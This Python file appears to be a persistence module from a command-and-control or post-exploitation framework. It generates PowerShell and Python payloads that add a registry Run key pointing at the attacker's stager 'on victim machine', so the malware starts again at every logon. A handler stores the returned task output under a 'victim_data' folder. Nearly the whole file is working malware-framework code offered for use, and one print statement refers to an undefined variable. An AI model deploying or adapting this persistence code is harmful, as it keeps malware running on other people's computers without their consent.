import sys
import os
import pdb
import pathlib
import time
import random
import string

sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module


class Registrykey(Module):

	description = 'This module creates a registry key in "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run". Note : This method of persistence is easily detectable.'
	@classmethod
	def module_options(cls):
		h = {
			'name' : 'Name of the registry key.',
			'value' : 'Value of the registry key, it should point to where the stager is present on victim machine. By default it takes the correct path'
		}
		return h

	def __init__(self,name,utility,language,options):
		## We are loading the script in the script variable here
		super(Registrykey, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    

	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
	def handle_task_output(self,data,options,victim_id,task_id):
		## Comes as a bytes object, so changing to string
		output = data.decode('utf-8')


		## Default Dumping path
		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)

		if not os.path.exists(dump_path):
			os.makedirs(dump_path)

		filename = f"registrykey_output_{task_id}.txt" 

		file_path = os.path.join(dump_path,filename)

		if 'path' in  options:
			if not os.path.exists(options['path']):
				print(f"Provided save path does not exists - {options['path']}. Saving to default directory {ss_path}")
			else:
				file_path = os.path.join(options['path'],filename)

		f = open(file_path,'w+')
		print(output,file=f)

		## In DB or in logs only indicate where the output is stored
		output = file_path
		return output

    

	def script_powershell(self,options):
		script = """function set_registry(){
			$registryPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
			$name = "##name##"
			$value = '##value##'
			New-ItemProperty -Path $registryPath -Name $name -Value $value
		}

		set_registry
		"""

		if 'name' in options:
			name = options['name']
		else:
			name = ''.join(random.choices(string.ascii_uppercase +string.digits, k = 10))
		script = script.replace('##name##',name)


		if 'value' in options:
			value = options['value']
		else:
			value = options['stager_location']

		script = script.replace('##value##',value)

		return script


	def script_python(self,options):
		script =  """def execute_command():
		try:
			import winreg
			REG_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
			winreg.CreateKey(winreg.HKEY_CURRENT_USER,REG_PATH)
			registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
			winreg.SetValueEx(registry_key, "##name##", 0, winreg.REG_SZ, "##value##")
			winreg.CloseKey(registry_key)
			return "Added registrykey successfully"
		except WindowsError as e:
			return e"""

		if 'name' in options:
			name = options['name']
		else:
			name = ''.join(random.choices(string.ascii_uppercase +string.digits, k = 10))
		script = script.replace('##name##',name)


		if 'value' in options:
			value = options['value']
		else:
			value = options['stager_location']

		script = script.replace('##value##',value.replace('\\','\\\\'))

		return script